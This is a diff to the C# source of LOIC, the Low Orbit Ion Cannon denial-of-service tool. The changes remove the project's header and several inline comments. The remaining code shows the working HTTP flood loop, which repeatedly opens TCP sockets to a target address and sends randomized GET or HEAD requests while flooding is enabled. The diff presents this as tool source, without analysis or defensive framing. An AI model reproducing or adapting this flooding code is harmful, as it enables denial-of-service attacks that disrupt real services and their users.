@@ -1,7 +1,4 @@
-/* LOIC - Low Orbit Ion Cannon
- * Released to the public domain
- * Enjoy getting v&, kids.
- */
+
 
 using System;
 using System.ComponentModel;
@@ -61,7 +58,6 @@ namespace LOIC
 		}
 		private void tTimepoll_Tick(object sender, EventArgs e)
 		{
-			// Protect against race condition
 			if(intShowStats) return; intShowStats = true;
 
 			if(Tick() > lastAction + Timeout)
@@ -81,13 +77,13 @@ namespace LOIC
 				IPEndPoint RHost = new IPEndPoint(IPAddress.Parse(IP), Port);
 				while (this.IsFlooding)
 				{
-					State = ReqState.Ready; // SET STATE TO READY //
+					State = ReqState.Ready;
 					lastAction = Tick();
 					byte[] recvBuf = new byte[128];
 					using (Socket socket = new Socket(RHost.AddressFamily, SocketType.Stream, ProtocolType.Tcp))
 					{
 						socket.NoDelay = true;
-						State = ReqState.Connecting; // SET STATE TO CONNECTING //
+						State = ReqState.Connecting;
 
 						try { socket.Connect(RHost); }
 						catch(SocketException) { goto _continue; }
@@ -95,12 +91,12 @@ namespace LOIC
 						byte[] buf = Functions.RandomHttpHeader((UseGet ? "GET" : "HEAD"), Subsite, Host, Random, AllowGzip);
 
 						socket.Blocking = Resp;
-						State = ReqState.Requesting; // SET STATE TO REQUESTING //
+						State = ReqState.Requesting;
 
 						try
 						{
 							socket.Send(buf, SocketFlags.None);
-							State = ReqState.Downloading; Requested++; // SET STATE TO DOWNLOADING // REQUESTED++
+							State = ReqState.Downloading; Requested++;
 
 							if (Resp)
 							{
@@ -110,7 +106,7 @@ namespace LOIC
 						}
 						catch(SocketException) { goto _continue; }
 					}
-					State = ReqState.Completed; Downloaded++; // SET STATE TO COMPLETED // DOWNLOADED++
+					State = ReqState.Completed; Downloaded++; 
 					tTimepoll.Stop();
 					tTimepoll.Start();
 _continue:
@@ -118,7 +114,6 @@ _continue:
 						System.Threading.Thread.Sleep(Delay+1);
 				}
 			}
-			// Analysis disable once EmptyGeneralCatchClause
 			catch { }
 			finally { tTimepoll.Stop(); State = ReqState.Ready; this.IsFlooding = false; }
 		}
